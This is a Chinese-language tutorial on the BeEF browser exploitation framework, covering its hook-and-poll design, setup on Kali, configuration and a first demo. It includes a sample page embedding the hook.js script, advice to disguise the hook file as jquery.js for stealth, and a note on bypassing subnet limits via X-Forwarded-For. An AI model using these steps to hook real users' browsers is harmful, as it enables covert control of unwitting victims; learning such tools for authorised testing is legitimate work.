## BeEF框架 

BeEF（ The Browser Exploitation Framework） 是由Wade Alcorn 在2006年开始创建的，至今还在维护。是由ruby语言开发的专门针对浏览器攻击的框架。这个框架也属于cs的结构，具体可以看下图：

[![12.png](https://image.3001.net/images/20180626/15299931636046.png!small)](https://image.3001.net/images/20180626/15299931636046.png)zombie（僵尸）即受害的浏览器。zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端UI， 和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF 的后台管理UI。

## BeEF 安装和配置 

BeEF 需要ruby 2.3 + 和 SQLite (或者mysql/postgres)。

### 在kali下使用BeEF

kali默认已经安装BeEF了。BeEF是Favorites 菜单中的一个（可以看出它的受欢迎程度和地位了），其标志是一个蓝色的公牛。命令是beef-xss:

[![13.png](https://image.3001.net/images/20180626/15300262657337.png!small)](https://image.3001.net/images/20180626/15300262657337.png)

打开五秒后，它还会使用浏览器打开管理页面的UI，默认帐号密码是：beef/beef，默认管理页面的UI 地址是：http://127.0.0.1:3000/ui/panel

kali已经把beef-xss做成服务了，推荐使用systemctl 命令来启动或关闭beef服务器

```
systemctl start beef-xss.service  #开启beef
systemctl stop beef-xss.service     #关闭beef
systemctl restart beef-xss.service  #重启beef
```

### 配置BeEF 

kali下的BeEF配置文件在  /usr/share/beef-xss/config.yaml,其它的配置文件也在这个目录的子目录下，往后在使用某些功能时，需要修改对应的配置文件。自主安装的BeEF配置文件会在BeEF的主目录下config.yaml,建议修改几个地方：

```
### 指定某个网段，只有在这个网段的浏览器才能被hookpermitted_hooking_subnet: "0.0.0.0/0"
### 指定某个网段，只有在这个网段的浏览器才能访问管理UI
permitted_ui_subnet: "0.0.0.0/0"
### 上面这两项都是可以被绕过的，只要使用X-Forwarded-For首部绕过，一般不需要设置
###  设置beef服务器的主机， 如果有自己的域名， 那么可以设置自己的域名, 没有就使用默认host: "0.0.0.0"
###  设置beef服务器监听的端口， 可以自己定一个，比如8080, 记得端口号需要大于1024port: "3000"
### 受害浏览器轮询beef主机的时间， 默认为1秒，可以设置为更低。
xhr_poll_timeout: 1000
#public: ""      # public hostname/IP address
#public_port: "" # experimental
### 这是让BeEF运行在一个反向代理或者NAT环境下才需要设置的。
### 管理页面的URI， 默认是/ui, 建议修改，这样就不会让别人找到你的管理页面web_ui_basepath: "/ui"
### hook_file 的名称， 建议修改， 可以修改为jquery.js之类的来提升隐蔽性hook_file: "/hook.js"
### 管理页面登录的用户名和密码， 这个一定要改，两个都改是最好的credentials:     user:   "beef"   
passwd: "beef"
```

## 小试牛刀

接下来实际使用BeEF，体验一下。先开启BeEF服务器，接着用浏览器访问管理页面http://127.0.0.1:3000/ui/panel， 使用设置的用户/密码登录。

接着访问有勾子的页面http://127.0.0.1:3000/demos/basic.html 这里的主机名和端口号要按照你设置的来修改， 这里要注意一下kali下beef版本的勾子不支持IE8，最新版或者旧一些的版本可以。所以要使用其他浏览器来访问有勾子的页面。

下面给出一个写有勾子的页面，把创建文件test.html，并把下面内容写到其中：

```
<html>
<head>
<script src='http://127.0.0.1:3000/hook.js'></script> <!-- 这里的主机和端口号，需要和配置文件的一致。 -->
</head>
<body>
Hello World
</body>
</html>
```

接着使用一个浏览器来打开，那么这个浏览器就会被hook了。

查看管理页面UI会是类似下面图：

[![8.png](https://image.3001.net/images/20180627/15300656117260.png!small)](https://image.3001.net/images/20180627/15300656117260.png)

[![9.png](https://image.3001.net/images/20180627/15300659136276.png!small)](https://image.3001.net/images/20180627/15300659136276.png)选一个简单的模块来试试， 下图是选用了Host –> Detect Virtual Machine 模块来查看受害浏览器是否在虚拟机上运行的：

[![14.png](https://image.3001.net/images/20180627/15300745052254.png!small)](https://image.3001.net/images/20180627/15300745052254.png)BeEF的入门使用就是这么简单，所有的功能都已经写好了，我们只需要选择模块，设置参数（有时不需要），点击Execute 就可以了。 当然必须知道这些模块的作用才行。

读者可能发现在每个模块的前面都有一个有色（绿色，灰色，橙色，红色）的小圆标志。

[![5.png](https://image.3001.net/images/20180627/15300748849474.png!small)](https://image.3001.net/images/20180627/15300748849474.png)

在内部，BeEF可以检测出哪些命令模块可以在当前受害的浏览器工作， 并用颜色表示：

绿色：命令模块可以在目标浏览器上运行，且用户不会感到任何异常

橙色：命令模块可以在目标浏览器上运行，但是用户可能会感到异常（比如可能会有弹窗，提示，跳转等）

灰色：命令模块尚未针对此目标进行验证，即不知道能否可运行

红色：命令模块不适用于此目标